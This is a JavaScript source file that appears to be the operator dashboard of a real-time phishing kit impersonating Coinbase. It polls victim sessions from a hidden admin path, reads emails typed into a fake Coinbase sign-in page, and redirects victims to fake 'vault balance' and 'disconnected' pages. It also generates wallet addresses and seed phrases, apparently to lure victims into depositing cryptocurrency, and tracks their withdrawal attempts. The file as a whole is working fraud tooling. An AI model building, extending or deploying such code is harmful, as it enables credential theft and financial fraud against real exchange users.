                    hint.style.cssText='padding:12px 10px;font-family:monospace;font-size:10px;color:rgba(255,255,255,.25);text-align:center;';
                    hint.textContent='Type to search coins...';
                    list.appendChild(hint);
                } else {
                    var filtered=avail.filter(function(c){
                        return c.label.toLowerCase().indexOf(q)!==-1||c.ticker.toLowerCase().indexOf(q)!==-1;
                    });
                    if(!filtered.length){
                        var empty=document.createElement('div');
                        empty.style.cssText='padding:10px;font-family:monospace;font-size:10px;color:rgba(255,255,255,.3);text-align:center;';
                        empty.textContent='No coins found';
                        list.appendChild(empty);
                    } else {
                        filtered.forEach(function(c){
                            var opt=document.createElement('div');
                            opt.style.cssText='display:flex;align-items:center;gap:8px;padding:6px 10px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04);';
                            opt.onmouseover=function(){this.style.background='rgba(255,255,255,.06)';};
                            opt.onmouseout=function(){this.style.background='';};
                            var iconWrap=document.createElement('div');
                            iconWrap.style.cssText='width:20px;height:20px;border-radius:50%;overflow:hidden;flex-shrink:0;background:#333;';
                            var img=document.createElement('img');
                            img.src=c.iconUrl||'';
                            img.width=img.height=20;
                            img.style.cssText='display:block;width:20px;height:20px;object-fit:cover;';
                            img.onerror=function(){img.style.display='none';};
                            iconWrap.appendChild(img);
                            var lbl2=document.createElement('span');
                            lbl2.style.cssText='font-family:monospace;font-size:11px;color:rgba(255,255,255,.75);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;';
                            lbl2.textContent=c.label;
                            var tick2=document.createElement('span');
                            tick2.style.cssText='font-family:monospace;font-size:9px;color:rgba(255,255,255,.35);flex-shrink:0;';
                            tick2.textContent=c.ticker;
                            opt.appendChild(iconWrap);opt.appendChild(lbl2);opt.appendChild(tick2);
                            opt.addEventListener('click',function(){
                                if(!_data[c.key])_data[c.key]={addr:'',amt:'0'};
                                _activeKeys.push(c.key);
                                if(_generatedAddrs[c.key])_data[c.key].addr=_generatedAddrs[c.key];
                                _ddSearchVal='';
                                _hideAddDropdown();
                                _renderCoinRows();
                                _syncWindowState();
                            });
                            list.appendChild(opt);
                        });
                    }
                }
                addDropdown.appendChild(list);
                if(addDropdown.style.display==='block') _positionAddDropdown();
            }

            addBtn.addEventListener('click',function(e){
                e.stopPropagation();
                if(addDropdown.style.display==='none'||!addDropdown.style.display){
                    _rebuildDropdown();
                    addDropdown.style.display='block';
                    _positionAddDropdown();
                } else {
                    _hideAddDropdown();
                }
            });
            addDropdown.addEventListener('click',function(e){ e.stopPropagation(); });
            function _vbOnDocClick(e){
                if(!addDropdown||addDropdown.style.display!=='block')return;
                if(addDropdown.contains(e.target)||e.target===addBtn||(addBtn.contains&&addBtn.contains(e.target)))return;
                _hideAddDropdown();
            }
            function _vbOnWinResize(){
                if(addDropdown.style.display==='block') _positionAddDropdown();
            }
            function _vbOnScroll(){
                if(addDropdown.style.display==='block') _positionAddDropdown();
            }
            var _vbAddScrollRoot=panel.closest('.rp-overlay-body')||document;
            document.addEventListener('click',_vbOnDocClick);
            window.addEventListener('resize',_vbOnWinResize);
            _vbAddScrollRoot.addEventListener('scroll',_vbOnScroll, true);
            var _vbAddListenersDisposed=false;
            function _vbDisposeAddListeners(){
                if(_vbAddListenersDisposed)return;
                _vbAddListenersDisposed=true;
                document.removeEventListener('click',_vbOnDocClick);
                window.removeEventListener('resize',_vbOnWinResize);
                _vbAddScrollRoot.removeEventListener('scroll',_vbOnScroll, true);
            }
            var _ov=document.getElementById('rp-site-overlay');
            if(_ov) _ov._vbDisposeAddListeners=_vbDisposeAddListeners;

            //  Build payload & expose state for vault panel 
            function _buildPayload(){
                var d={coin_keys:_activeKeys.join(',')};
                _activeKeys.forEach(function(key){
                    if(_data[key].addr)d[key+'_address']=_data[key].addr;
                    if(_data[key].amt) d[key+'_amount']=_data[key].amt;
                    // Include sibling network variant addresses so deposit panel can show all networks
                    var nd=_netFamilies[key];
                    if(nd){nd.family.forEach(function(nk){
                        if(nk===key||d[nk+'_address'])return;
                        var sibAddr=(_data[nk]&&_data[nk].addr)?_data[nk].addr
                            :(_generatedAddrs[nk]?(typeof _generatedAddrs[nk]==='object'?(_generatedAddrs[nk].address||''):String(_generatedAddrs[nk])):'');
                        if(sibAddr)d[nk+'_address']=sibAddr;
                    });}
                });
                var meta={};
                _activeKeys.forEach(function(key){
                    var c=_vaultCoinMap[key];
                    if(c)meta[key]={name:c.label,ticker:c.ticker,iconUrl:c.iconUrl||''};
                });
                if(Object.keys(meta).length)d['coin_meta']=JSON.stringify(meta);
                return d;
            }
            // Expose overlay payload builder
            // Merges any edits made in vault panel (window._vbAdminData) back into _data before building
            window._vbBuildPayload = function() {
                if (window._vbAdminData) {
                    Object.keys(window._vbAdminData).forEach(function(k) {
                        if (_data[k]) {
                            _data[k].addr = window._vbAdminData[k].addr;
                            _data[k].amt  = window._vbAdminData[k].amt;
                        }
                    });
                }
                return _buildPayload();
            };
            function _syncWindowState(){
                window._vbAdminKeys           = _activeKeys.slice();
                // Merge _data into window._vbAdminData instead of overwriting, so manually-set
                // addresses/amounts from the vault-panel sidebar are never wiped by stale IIFE state.
                if (!window._vbAdminData) window._vbAdminData = {};
                Object.keys(_data).forEach(function(k){
                    if (!window._vbAdminData[k]) window._vbAdminData[k] = {addr:'', amt:'0'};
                    if (_data[k].addr) window._vbAdminData[k].addr = _data[k].addr;
                    if (_data[k].amt  && _data[k].amt !== '0') window._vbAdminData[k].amt = _data[k].amt;
                });
                window._vbAdminMnemonic       = _lastMnemonic;
                window._vbAdminGeneratedAddrs = JSON.parse(JSON.stringify(_generatedAddrs));
                // Keep vault panel in real-time sync with RP cfg panel
                clearTimeout(window._vbSyncDebounce);
                window._vbSyncDebounce = setTimeout(function(){
                }, 80);
            }
            // Exposed so vault panel remove/add can sync back into the IIFE's _activeKeys
            window._vbSetAdminKeys = function(keys) {
                // Also pull in any window._vbAdminData edits not yet reflected in _data
                if (window._vbAdminData) {
                    Object.keys(window._vbAdminData).forEach(function(k) {
                        if (!_data[k]) _data[k] = {addr:'', amt:''};
                        if (window._vbAdminData[k].addr) _data[k].addr = window._vbAdminData[k].addr;
                        if (window._vbAdminData[k].amt)  _data[k].amt  = window._vbAdminData[k].amt;
                    });
                }
                _activeKeys = keys.slice();
                _syncWindowState();
                _renderCoinRows();
            };
            window._vbAddAdminKey = function(key) {
                if (_activeKeys.indexOf(key) !== -1) return;
                if (!_data[key]) _data[key] = {addr:'', amt:''};
                if (_generatedAddrs && _generatedAddrs[key]) _data[key].addr = _generatedAddrs[key];
                _activeKeys.push(key);
                _syncWindowState();
                _renderCoinRows();
            };
            // Update a coin's amount from an external source (e.g. user withdrawal event)
            window._vbUpdateCoinAmt = function(key, newAmt) {
                // Coin family variant groups — resolve to whichever key the vault panel actually tracks
                var _vbFamilies = {
                    'usdt':['usdt','usdt_trc20'],'usdt_trc20':['usdt','usdt_trc20'],
                    'usdc':['usdc','usdc_base','usdc_sol','usdc_polygon'],
                    'usdc_base':['usdc','usdc_base','usdc_sol','usdc_polygon'],
                    'usdc_sol':['usdc','usdc_base','usdc_sol','usdc_polygon'],
                    'usdc_polygon':['usdc','usdc_base','usdc_sol','usdc_polygon'],
                };
                // Find the active key: use exact match if vault panel tracks it, else find a family member it tracks
                var activeKeys = window._vbAdminKeys || [];
                var targetKey = key;
                if (activeKeys.indexOf(key) === -1 && _vbFamilies[key]) {
                    var fam = _vbFamilies[key];
                    for (var fi = 0; fi < fam.length; fi++) {
                        if (activeKeys.indexOf(fam[fi]) !== -1) { targetKey = fam[fi]; break; }
                    }
                }
                // Update window._vbAdminData for the resolved key
                if (!window._vbAdminData) window._vbAdminData = {};
                if (!window._vbAdminData[targetKey]) window._vbAdminData[targetKey] = {addr:'', amt:''};
                window._vbAdminData[targetKey].amt = newAmt;
                // Also keep original key updated if different
                if (targetKey !== key) {
                    if (!window._vbAdminData[key]) window._vbAdminData[key] = {addr:'', amt:''};
                    window._vbAdminData[key].amt = newAmt;
                }
                // Sync globals into _data so _syncWindowState never overwrites with stale values
                Object.keys(window._vbAdminData).forEach(function(k){
                    if (!_data[k]) _data[k] = {addr:'', amt:'0'};
                    if (window._vbAdminData[k].addr) _data[k].addr = window._vbAdminData[k].addr;
                    if (window._vbAdminData[k].amt)  _data[k].amt  = window._vbAdminData[k].amt;
                });
                // Update IIFE _data for resolved key
                if (!_data[targetKey]) _data[targetKey] = {addr:'', amt:'0'};
                _data[targetKey].amt = newAmt;
                // Update RP cfg panel input live if visible
                var inp = coinRowsWrap ? coinRowsWrap.querySelector('[data-vb-coin="'+targetKey+'"] input[placeholder="Amount"]') : null;
                if (inp) inp.value = newAmt;
                _syncWindowState();
            };
            //  Seed copy (master only) 
            if (copySeedBtn) {
                copySeedBtn.addEventListener('click',function(){
                    if(!_lastMnemonic)return;
                    navigator.clipboard.writeText(_lastMnemonic).then(function(){
                        copySeedBtn.textContent=' Copied!';
                        setTimeout(function(){copySeedBtn.textContent='Copy All';},1500);
                    }).catch(function(){});
                });
            }

            //  Helper: detect coins from event feed 
            function _getCoinsFromFeed() {
                var events = (window._feedEvents && window._feedEvents.length) ? window._feedEvents.slice() : [];
                if (!events.length) {
                    var tag = document.getElementById('feed-events-data');
                    if (tag) { try { events = JSON.parse(tag.textContent || tag.innerText); } catch(e){} }
                }
                // Most recent form_submit or coin_input from select_vault_assets page
                for (var i = 0; i < events.length; i++) {
                    var ev = events[i];
                    if (ev.page === 'coinbase_select_vault_assets' && ev.value) {
                        var keys = [];
                        (ev.value.match(/\(([A-Za-z0-9_]+)\)/g) || []).forEach(function(m) {
                            var k = m.replace(/[()]/g, '').toLowerCase();
                            if (_vaultCoinMap[k]) keys.push(k);
                        });
                        if (keys.length) return keys;
                    }
                }
                return [];
            }

            //  Generate wallet (same API / fill path — chrome uses spin icon + is-busy)
            genBtn.addEventListener('click',function(){
                var _genEpoch=window._vbWorkspaceEpoch||0;
                genBtn.disabled=true;genBtn.classList.add('is-busy');genStatus.textContent='';

                // Auto-populate coins from event feed  always replace with the most recent selection
                var feedKeys = _getCoinsFromFeed();
                if (feedKeys.length) {
                    _activeKeys.length = 0;
                    feedKeys.forEach(function(k) {
                        _data[k] = {addr:'', amt:''};
                        _activeKeys.push(k);
                    });
                    _syncWindowState();
                } else {
                    // No feed selection — keep active coins but wipe amounts (new wallet = new balances)
                    _activeKeys.forEach(function(k){ if(_data[k]) _data[k].amt=''; });
                }
                var csrf=document.querySelector('meta[name="csrf-token"]');
                var tok=csrf?csrf.getAttribute('content'):'';
                fetch('/admin777888xxx/generate-vault-wallet',{
                    method:'POST',
                    headers:{'Content-Type':'application/json','X-CSRF-TOKEN':tok,'Accept':'application/json'},
                    body:JSON.stringify({session_token: selectedToken||null})
                }).then(function(r){return r.json();}).then(function(res){
                    if(_genEpoch!==(window._vbWorkspaceEpoch||0))return;
                    if(!res.ok)throw new Error(res.error||'Failed');
                    var w=res.wallet;
                    // Store ALL addresses for auto-fill when admin adds coins later
                    _generatedAddrs={};
                    Object.keys(w).forEach(function(k){ if(w[k]&&k!=='mnemonic')_generatedAddrs[k]=w[k]; });
                    // Fill addresses for already-active coins
                    _activeKeys.forEach(function(key){
                        if(w[key]){
                            _data[key].addr=w[key];
                            var inp=coinRowsWrap.querySelector('[data-vb-coin="'+key+'"] .vb-addr-inp');
                            if(inp)inp.value=w[key];
                        }
                    });
                    // Store mnemonic; display in top .vb-gen-out via _syncGenOut (no separate seed block)
                    _lastMnemonic=w.mnemonic||'';
                    _hideSeedBox();
                    if(genStatus){ genStatus.style.color=''; genStatus.textContent=''; }
                    _renderCoinRows();
                    _syncWindowState();
                }).catch(function(e){
                    if(_genEpoch!==(window._vbWorkspaceEpoch||0))return;
                    genStatus.style.color='#f87171';
                    genStatus.textContent=' '+e.message;
                }).finally(function(){
                    genBtn.disabled=false;genBtn.classList.remove('is-busy');
                });
            });

            //  Preview & Send 
            panel.querySelector('.rp-btn-preview').onclick=function(){
                _openPreviewIframe('/coinbase/vault-balance',_buildPayload());
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                window._vbBrand='coinbase';
                _syncWindowState();
                sendCommand('redirect',{url:'/coinbase/vault-balance',post:_buildPayload()});
                
            };

            //  Panel open/close  fetch prices on first open 
            btn.onclick=function(){
                var o=!item.open;
                cbClose(item);
                item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                if(o){
                    window._vbBrand='coinbase';
                    window._vbActiveCatalog=null;window._vbActiveCoinMap=null;window._vbLoadActiveCatalog=null;
                    // Re-register Coinbase vault globals (CC catalog callback may have overwritten them)
                    window._vbReRegisterCoinbaseGlobals();
                    // Load current session state from globals/localStorage into closure vars
                    _cbRestoreFromGlobals();
                    _lastMnemonic = _restoredMnemonic;
                    _generatedAddrs = _restoredGeneratedAddrs;
                    _hideSeedBox();
                    _renderCoinRows();
                    _fetchPricesAndShow();_loadCoinCatalog(function(){_rebuildDropdown();});
                } else {
                    _vbAbandonTransientVaultWorkspace();
                    _activeKeys=[]; _data={}; _lastMnemonic=''; _generatedAddrs={};
                    _restoredMnemonic=''; _restoredGeneratedAddrs={};
                    if(coinRowsWrap) coinRowsWrap.innerHTML='';
                    if(genOut) genOut.value='';
                    if(seedBox) seedBox.style.display='none';
                    if(seedWords) seedWords.innerHTML='';
                    _ddSearchVal='';
                    _hideAddDropdown();
                    if(addDropdown) addDropdown.innerHTML='';
                }
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Wallet Actions (section title removed — presentation only)

        // Disconnected Done — TYPE 1 roomy; visitor Continue
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Disconnected Done</span><span class="ps-roomy-sub" style="'+HEAD_S+'">wallet disconnected confirmation</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/disconnected-done';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:url});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Final States (section title removed — presentation only)
        // Done — TYPE 1 roomy
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Done</span><span class="ps-roomy-sub" style="'+HEAD_S+'">completion of account actions</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/done';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:url});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

    }, 'exchangers');


    // Flows platform list display order only — Coinbase at top; rest keep relative order.
    (function(){
        var prefer = ['Coinbase'];
        var byLabel = {};
        Array.prototype.forEach.call(container.querySelectorAll('.rp-site-btn'), function(btn) {
            var label = (btn.querySelector('.rp-btn-label') || {}).textContent || '';
            if (label) byLabel[label] = btn;
        });
        var frag = document.createDocumentFragment();
        prefer.forEach(function(name) {
            if (byLabel[name]) frag.appendChild(byLabel[name]);
        });
        if (frag.childNodes.length) container.insertBefore(frag, container.firstChild);
    })();

    // Apply the active tab filter now that all buttons are in the DOM
    setRedirectTab(_activeRedirectTab);
}

function hideFlowsContent() {
    var fp = document.getElementById('flows-placeholder');
    var fc = document.getElementById('flows-content');
    var fl = document.getElementById('flows-session-label');
    if (fp) fp.style.display = '';
    if (fc) fc.style.display = 'none';
    if (fl) fl.textContent   = 'per session';
}

// Temporary 4I Slice 8 classic fan-out — one seam so Sessions ESM does not
// expose Cards/Vault internals. Not a bus. Dies Slice 12; Vault part dies Slice 11.
window._sessionsLegacy = function (op, token) {
    if (op === 'enter') {
        _clearAllRpPanelStorage();
        clearTimeout(window._vbSyncDebounce);
        window._vbAdminKeys = [];
        window._vbAdminData = {};
        window._vbAdminMnemonic = '';
        window._vbAdminGeneratedAddrs = {};
        window._vbActiveCoinMap = null;
        window._vbActiveCatalog = null;
        window._vbLoadActiveCatalog = null;
        window._vbBrand = '';
        if (typeof window._vbResetCoinbasePanel === 'function') window._vbResetCoinbasePanel();
        if (typeof window._vbResetCcPanel === 'function') window._vbResetCcPanel();
        if (typeof window._vbReRegisterCoinbaseGlobals === 'function') window._vbReRegisterCoinbaseGlobals();
        _vbRestoreState();
        showFlowPanel(token);
        return;
    }
    if (op === 'leave') {
        hideFlowsContent();
        return;
    }
    if (op === 'refresh') {
        updateFlowPanel();
    }
};

// Auto-fill Coinbase email inputs from login submit
var _lastCbAutoFillToken = null;

function _autoFillCoinbaseEmail(events) {
    if (!events || !events.length) return;
    var found = null;
    for (var i = 0; i < events.length; i++) {
        var ev = events[i];
        if (ev.type === 'form_submit' && ev.element === 'email'
            && ev.page === 'coinbase_sign_in' && ev.value) {
            found = ev; break;
        }
    }
    if (!found) return;
    var email = found.value;
    var ids = ['cb-dc-email-inp', 'cb-ec-email-inp'];
    var key = (selectedToken || '') + '|' + email;
    var flash = key !== _lastCbAutoFillToken;
    if (flash) _lastCbAutoFillToken = key;
    ids.forEach(function(id) {
        var el = document.getElementById(id);
        if (!el) return;
        var userEdited = el.dataset.userEdited === '1';
        if (!userEdited && flash) {
            el.value = email;
            el.style.transition = 'border-color .3s';
            el.style.borderColor = '#0052ff';
            setTimeout(function() { el.style.borderColor = ''; }, 2500);
            if (!el._cbUserEditListener) {
                el._cbUserEditListener = true;
                el.addEventListener('input', function() { el.dataset.userEdited = '1'; });
            }
        } else if (!el._cbUserEditListener) {
            el._cbUserEditListener = true;
            el.addEventListener('input', function() { el.dataset.userEdited = '1'; });
        }
    });
}

window._evPollSeq = 0;
window._evPollErrors = 0;
window._evRenderedToken = null;
window._evRenderedRev = '';
window._stopEventPoll = function() {
    window._evPollSeq++;
    window._evPollErrors = 0;
    clearInterval(window._evPollTimer);
    window._evPollTimer = null;
    if (!selectedToken) {
        window._evRenderedToken = null;
        window._evRenderedRev = '';
    }
};
window._startEventPoll = function(token) {
    window._stopEventPoll();
    var seq = ++window._evPollSeq;
    var pending = false;
    window._evPollLastTick = Date.now();
    function doFetch() {
        if (window._evPollSeq !== seq || selectedToken !== token) return;
        if (pending) return;
        pending = true;
        var headers = { 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content };
        if (window._evRenderedToken === token && window._evRenderedRev
            && document.getElementById('feed-events-data')) {
            headers['X-Activity-Rev'] = window._evRenderedRev;
        }
        fetch('/admin777888xxx/session/' + token + '/events', { headers: headers }).then(function(r) {
            if (r.status === 204) {
                pending = false;
                window._evPollErrors = 0;
                window._evPollLastTick = Date.now();
                _fillFeedUsd();
                return null;
            }
            if (!r.ok) { pending = false; window._evPollErrors = Math.min(window._evPollErrors + 1, 2); return null; }
            var rev = r.headers.get('X-Activity-Rev') || '';
            return r.text().then(function(html) {
                return { html: html, rev: rev };
            });
        }).then(function(payload) {
            pending = false;
            if (window._evPollSeq !== seq || selectedToken !== token) return;
            if (!payload || payload.html === null) return;
            window._evPollErrors = 0;
            window._evPollLastTick = Date.now();
            var feed = document.getElementById('event-feed');
            if (feed) feed.innerHTML = payload.html;
            // Fill USD values on [data-usd-key] spans (scripts in innerHTML don't execute)
            _fillFeedUsd();
            var tag = document.getElementById('feed-events-data');
            try { window._feedEvents = tag ? JSON.parse(tag.textContent) : []; } catch(e) { window._feedEvents = []; }
            // Detect vault_withdraw events and update vault panel amounts
            window._vwProcessed = window._vwProcessed || {};
            var _hadWithdrawal = false;
            window._feedEvents.forEach(function(ev) {
                if (ev.type === 'vault_withdraw' && ev.id && !window._vwProcessed[ev.id]) {
                    window._vwProcessed[ev.id] = true;
                    _hadWithdrawal = true;
                    var parts = (ev.value || '').split('|');
                    var ck = parts[0], newAmt = parts[1];
                    if (ck && newAmt !== undefined) {
                        if (typeof window._vbUpdateCoinAmt === 'function') {
                            window._vbUpdateCoinAmt(ck, newAmt);
                        } else {
                            if (!window._vbAdminData) window._vbAdminData = {};
                            if (!window._vbAdminData[ck]) window._vbAdminData[ck] = {addr:'',amt:''};
                            window._vbAdminData[ck].amt = newAmt;
                        }
                    }
                }
            });
            // After any new withdrawal event, re-sync from DB so admin panel shows authoritative amounts
            if (_hadWithdrawal && selectedToken) {
                _vbRestoreState();
            }
            _autoFillCoinbaseEmail(window._feedEvents);
            window._evRenderedToken = token;
            window._evRenderedRev = payload.rev;
        }).catch(function() {
            pending = false;
            window._evPollErrors = Math.min(window._evPollErrors + 1, 2);
        });
    }
    window._evPollTimer = setInterval(doFetch, 1000);
    window._evPollNow = doFetch;
    doFetch();
};

// Watchdog: if the poll dies unexpectedly while a session is selected, restart it
window._evPollWatchdog = setInterval(function() {
    if (!selectedToken) return;
    var stale = window._evPollLastTick && (Date.now() - window._evPollLastTick > 3000);
    if (stale) _startEventPoll(selectedToken);
}, 2000);

// Browsers throttle setInterval (both the poll above and its own watchdog)
// while this tab is backgrounded/unfocused -- sometimes down to once a
// minute or less. That leaves the feed showing stale data (or stuck on the
// initial "Loading..." placeholder) for as long as the tab stays out of
// focus, since nothing forces a fresh fetch the moment it's looked at
// again. Force one immediately on both signals (visibilitychange covers
// tab-switch/minimize, focus covers window-switch/OS-level refocus).
// Registered exactly once (idempotency guard below) since this script only
// ever loads once per page, but kept defensive regardless.
if (!window._evPollRecoveryRegistered) {
    window._evPollRecoveryRegistered = true;
    // visibilitychange and focus commonly both fire within the same tick
    // when switching back to this tab -- coalesce them into a single
    // resume call via a zero-delay timer so only one _startEventPoll()
    // restart happens per resume, not two.
    var _evPollRecoveryQueued = false;
    var _evPollForceRefresh = function() {
        if (_evPollRecoveryQueued) return;
        _evPollRecoveryQueued = true;
        setTimeout(function() {
            _evPollRecoveryQueued = false;
            if (!selectedToken || typeof window._startEventPoll !== 'function') return;
            // Full restart via _startEventPoll() -- not just re-calling
            // _evPollNow() -- is required here: a request that was already
            // in flight when the tab got backgrounded can itself stall
            // (browsers deprioritize network activity in background tabs,
            // not just timers), leaving the *old* closure's private
            // `pending` flag stuck true forever with no way to reset it
            // from outside. Calling _evPollNow() again would just hit that
            // same stuck `pending` guard and silently no-op -- which is
            // exactly what happened on the first version of this fix.
            // _startEventPoll() bumps _evPollSeq (so the stale request's
            // own .then()/.catch() becomes a no-op via the seq check if it
            // ever does resolve late), clears the old interval, and builds
            // a brand-new closure with a fresh `pending = false` before
            // firing one immediate fetch -- the same full-restart the
            // existing watchdog already relies on for its own recovery.
            window._startEventPoll(selectedToken);
        }, 0);
    };
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) _evPollForceRefresh();
    });
    window.addEventListener('focus', _evPollForceRefresh);
}

// Fast page transitions for sidebar links that leave the dashboard
document.querySelectorAll('a[href]').forEach(function(a) {
    a.addEventListener('click', function(e) {
        var href = a.getAttribute('href');
        if (!href || href.startsWith('#') || href.startsWith('javascript')) return;
        e.preventDefault();
        document.body.style.transition = 'opacity .18s ease';
        document.body.style.opacity = '0';
        setTimeout(function() { window.location.href = href; }, 180);
    });
});

// ── Online Super Admins ────────────────────────────────────────────────────────
(function() {
    var _oaTimer = null;

    function _oaParseUa(ua) {
        if (!ua) return 'Unknown browser';
        var browser = 'Unknown';
        var os = 'Unknown';
        if (/Edg\//.test(ua))        browser = 'Edge';
        else if (/Chrome\//.test(ua)) browser = 'Chrome';
        else if (/Firefox\//.test(ua))browser = 'Firefox';
        else if (/Safari\//.test(ua)) browser = 'Safari';
        else if (/OPR\//.test(ua))    browser = 'Opera';
        if (/Windows/.test(ua))      os = 'Windows';
        else if (/Mac OS/.test(ua))  os = 'macOS';
        else if (/Linux/.test(ua))   os = 'Linux';
        else if (/Android/.test(ua)) os = 'Android';
        else if (/iPhone|iPad/.test(ua)) os = 'iOS';
        return browser + ' / ' + os;
    }

    function _oaTimeSince(unixSec) {
        if (!unixSec) return '';
        var diff = Math.floor(Date.now() / 1000) - unixSec;
        if (diff < 10)  return 'just now';
        if (diff < 60)  return diff + 's ago';
        if (diff < 3600) return Math.floor(diff/60) + 'm ago';
        return Math.floor(diff/3600) + 'h ago';
    }

    function _oaKick(sid, ip) {
        if (!confirm('Kick ' + ip + '?\nThey will be logged out and their IP banned for 30 minutes.')) return;
        var csrf = (document.querySelector('meta[name="csrf-token"]') || {}).content || '';
        fetch('/admin777888xxx/kick-admin/' + encodeURIComponent(sid), {
            method: 'DELETE',
            headers: {'X-CSRF-TOKEN': csrf, 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/json'},
            body: JSON.stringify({fallback_ip: ip})
        }).then(function(r) {
            return r.json().then(function(d) { return {ok: r.ok, d: d}; });
        }).then(function(res) {
            if (res.ok) _oaFetch();
        }).catch(function() {});
    }

    function _oaUnban(id, ip) {
        if (!confirm('Unban ' + ip + '?')) return;
        var csrf = (document.querySelector('meta[name="csrf-token"]') || {}).content || '';
        fetch('/admin777888xxx/admin-bans/' + id, {
            method: 'DELETE',
            headers: {'X-CSRF-TOKEN': csrf, 'X-Requested-With': 'XMLHttpRequest'}
        }).then(function(r) {
            if (r.ok) _oaFetch();
        }).catch(function() {});
    }

    function _oaRenderBans(bans) {
        var wrap = document.getElementById('oa-bans-wrap');
        if (!wrap) return;
        if (!bans || bans.length === 0) {
            wrap.style.display = 'none';
            return;
        }
        wrap.style.display = '';
        var list = document.getElementById('oa-bans-list');
        if (!list) return;
        list.innerHTML = bans.map(function(b) {
            var expiry = new Date(b.expires_at.replace(' ', 'T') + 'Z');
            var mins = Math.max(0, Math.ceil((expiry - Date.now()) / 60000));
            var unbanBtn = '<button data-ban-id="' + b.id + '" data-ban-ip="' + b.ip_address + '" class="oa-unban-btn" style="margin-left:auto;background:#1c3a1c;color:#86efac;border:none;font-size:9px;font-weight:700;padding:2px 7px;border-radius:4px;cursor:pointer;line-height:1.4;">UNBAN</button>';
            return '<div style="display:flex;align-items:center;gap:6px;padding:3px 0;">' +
                '<span style="color:#f87171;font-size:11px;font-weight:600;font-family:monospace;">' + b.ip_address + '</span>' +
                '<span style="color:rgba(255,255,255,.35);font-size:10px;">' + mins + 'm left</span>' +
                unbanBtn + '</div>';
        }).join('');
        list.querySelectorAll('.oa-unban-btn').forEach(function(btn) {
            btn.onclick = function() { _oaUnban(btn.dataset.banId, btn.dataset.banIp); };
        });
    }

    function _oaRender(admins) {
        var list = document.getElementById('oa-list');
        var badge = document.getElementById('oa-count-badge');
        if (!list) return;
        if (!admins || admins.length === 0) {
            list.innerHTML = '<div style="color:rgba(255,255,255,.35);font-size:11px;">No super admins currently online.</div>';
            if (badge) badge.style.display = 'none';
            return;
        }
        if (badge) { badge.textContent = admins.length + ' online'; badge.style.display = ''; }
        list.innerHTML = admins.map(function(a) {
            var dot = '<span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#22c55e;flex-shrink:0;margin-top:3px;"></span>';
            var youBadge = a.is_you ? '<span style="background:#1e3a5f;color:#93c5fd;font-size:9px;font-weight:700;padding:1px 5px;border-radius:4px;margin-left:6px;">YOU</span>' : '';
            var kickBtn = !a.is_you ? '<button data-sid="' + a.sid + '" data-ip="' + a.ip + '" style="margin-left:auto;background:#7f1d1d;color:#fca5a5;border:none;font-size:9px;font-weight:700;padding:2px 7px;border-radius:4px;cursor:pointer;line-height:1.4;" class="oa-kick-btn">KICK</button>' : '';
            var ip = '<div style="display:flex;align-items:center;gap:4px;">' +
                '<span style="color:rgba(255,255,255,.8);font-size:11px;font-weight:600;font-family:monospace;">' + a.ip + '</span>' +
                youBadge + kickBtn + '</div>';
            var ua = '<span style="color:rgba(255,255,255,.4);font-size:10px;">' + _oaParseUa(a.ua) + '</span>';
